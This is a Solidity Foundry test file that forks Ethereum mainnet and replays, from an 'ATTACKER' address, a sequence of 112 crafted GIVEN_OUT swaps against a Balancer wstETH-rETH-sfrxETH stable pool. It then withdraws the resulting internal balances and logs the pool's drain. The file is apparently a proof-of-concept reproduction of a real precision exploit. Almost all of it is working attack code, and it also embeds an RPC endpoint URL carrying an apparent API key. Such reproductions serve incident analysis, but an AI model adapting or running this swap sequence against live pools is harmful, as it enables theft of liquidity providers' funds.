// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

contract BalancerQuadPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    bytes32 constant POOL_ID_QUAD = 0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467;
    address constant QUAD_BPT = 0x5aEe1e99fE86960377DE9f88689616916D5DcaBe;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant sfrxETH = 0xac3E018457B222d93114458476f3E3416Abbe38F;
    address constant rETH = 0xae78736Cd615f374D3085123A210448E74Fc6393;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay
        uint8 indexIn;
        uint8 indexOut;
    }

    function testQuadPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );


        console.log("Pool: wstETH-rETH-sfrxETH (0x5aee1e99fe86960377de9f88689616916d5dcabe000000000000000000000467)");
        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("wstETH:", initialBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rETH:", initialBalances[3] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(QUAD_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(QUAD_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(wstETH).approve(address(VAULT), type(uint256).max);
        IERC20(sfrxETH).approve(address(VAULT), type(uint256).max);
        IERC20(rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[112] memory swaps;

        swaps[0] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 698964958917799834,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[1] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 4935819392170067680,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[2] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 776623513617677601,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[3] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 6989649589177998,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[4] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 49358193921700677,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[5] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 7766235136176776,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[6] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 69896495891780,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[7] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 493581939217006,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[8] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 77662351361768,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[9] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 698964958918,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[10] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 4935819392170,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[11] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 776623513618,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[12] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 6989649589,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[13] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 49358193922,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[14] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 7766235136,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[15] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 69896496,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[16] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 493581939,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[17] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 77662351,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[18] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 698965,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[19] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 4935820,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[20] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 776624,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[21] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 6990,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[22] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 49358,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[23] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 7766,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[24] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: wstETH,
            amount: 71,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 1
        });

        swaps[25] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 494,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[26] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: rETH,
            amount: 79,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 3
        });

        swaps[27] = ExactSwapData({
            tokenIn: QUAD_BPT,
            tokenOut: sfrxETH,
            amount: 5,
            expectedIn: 0,
            indexIn: 0,
            indexOut: 2
        });

        swaps[28] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 19999999995,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[29] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[30] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 87000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[31] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 8856,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[32] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[33] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 62000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[34] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 17090,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[35] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[36] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 44000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[37] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 10095,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[38] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[39] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 31000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[40] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 2996,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[41] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[42] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 22000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[43] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 3034,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[44] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[45] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 15000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[46] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 249,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[47] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[48] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 11000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[49] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 1049,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[50] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[51] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 8000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[52] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 70398,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[53] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[54] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 5400000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[55] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 65940,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[56] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[57] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 3800000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[58] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 2012,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[59] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[60] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 2700000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[61] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 2487,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[62] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[63] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 1900000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[64] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 749,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[65] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[66] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 1300000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[67] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 155,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[68] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[69] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 990000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[70] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 9764,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[71] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[72] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 730000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[73] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 3212,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[74] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[75] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 520000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[76] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 1092,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[77] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[78] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 370000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[79] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 781,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[80] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[81] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 270000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[82] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 1224,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[83] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[84] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 180000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[85] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 1935,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[86] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[87] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 130000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[88] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 84,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[89] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[90] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 97000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[91] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 593,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[92] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[93] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 75000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[94] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 331,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[95] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[96] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 54000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[97] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 360,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[98] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[99] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 34200000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[100] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 19,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[101] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: wstETH,
            amount: 4,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 1
        });

        swaps[102] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: sfrxETH,
            amount: 27000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 2
        });

        swaps[103] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: QUAD_BPT,
            amount: 10000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[104] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: QUAD_BPT,
            amount: 10000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[105] = ExactSwapData({
            tokenIn: rETH,
            tokenOut: QUAD_BPT,
            amount: 10000000000,
            expectedIn: 0,
            indexIn: 3,
            indexOut: 0
        });

        swaps[106] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: QUAD_BPT,
            amount: 10000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[107] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: QUAD_BPT,
            amount: 10000000000000000,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[108] = ExactSwapData({
            tokenIn: rETH,
            tokenOut: QUAD_BPT,
            amount: 2257356215128872610,
            expectedIn: 0,
            indexIn: 3,
            indexOut: 0
        });

        swaps[109] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: QUAD_BPT,
            amount: 2257356215128872610,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 0
        });

        swaps[110] = ExactSwapData({
            tokenIn: sfrxETH,
            tokenOut: QUAD_BPT,
            amount: 2257356215128872610,
            expectedIn: 0,
            indexIn: 2,
            indexOut: 0
        });

        swaps[111] = ExactSwapData({
            tokenIn: wstETH,
            tokenOut: rETH,
            amount: 370000000000000000,
            expectedIn: 0,
            indexIn: 1,
            indexOut: 3
        });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_QUAD,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // Withdrawal via manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(QUAD_BPT);
        internalTokens[1] = IERC20(wstETH);
        internalTokens[2] = IERC20(sfrxETH);
        internalTokens[3] = IERC20(rETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  wstETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  sfrxETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[3] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(QUAD_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(wstETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(sfrxETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[3] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rETH),
                    amount: internalBalances[3],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_QUAD);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("wstETH:", finalBalances[1] / 1e18, "ETH");
        console.log("sfrxETH:", finalBalances[2] / 1e18, "ETH");
        console.log("rETH:", finalBalances[3] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(QUAD_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("wstETH:", IERC20(wstETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("sfrxETH:", IERC20(sfrxETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps:", successCount);
        console.log("SUCCESS!");
    }

}
